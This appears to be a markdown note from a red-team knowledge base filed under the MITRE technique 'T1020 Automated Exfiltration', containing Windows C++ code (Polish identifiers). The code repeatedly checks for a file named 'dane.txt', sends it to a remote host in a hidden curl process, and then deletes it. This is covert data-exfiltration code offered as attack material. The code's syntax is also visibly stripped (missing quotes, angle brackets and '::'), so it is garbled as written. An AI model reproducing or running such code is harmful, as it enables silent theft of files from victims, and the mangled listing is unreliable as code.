@@ -1,0 +1,48 @@
+---
+title: "T1020.Automated Exfiltration"
+folder: "13. Exfiltration"
+---
+
+
+
+
+
+#include windows.h
+#include fstream
+#include iostream
+#include thread
+
+void WyslijPlik() {
+        const char command = curl -X POST --data-BINARY @dane.txt http10.0.2.158000;
+        STARTUPINFOA si = {};
+        si.cb = sizeof(STARTUPINFOA);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+
+        PROCESS_INFORMATION pi;
+
+
+        if (CreateProcessA(NULL, const_castLPSTR(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        }
+        stdremove(dane.txt);
+}
+ 
+void SprawdzPlik() {
+    stdstring nazwaPliku = dane.txt;
+    while (true) {
+        stdifstream plik(nazwaPliku);
+        if (plik.is_open()) {
+            plik.close();
+            WyslijPlik();
+        }
+        stdthis_threadsleep_for(stdchronoseconds(10)); 
+    }
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    SprawdzPlik();
+    return 0;
+}
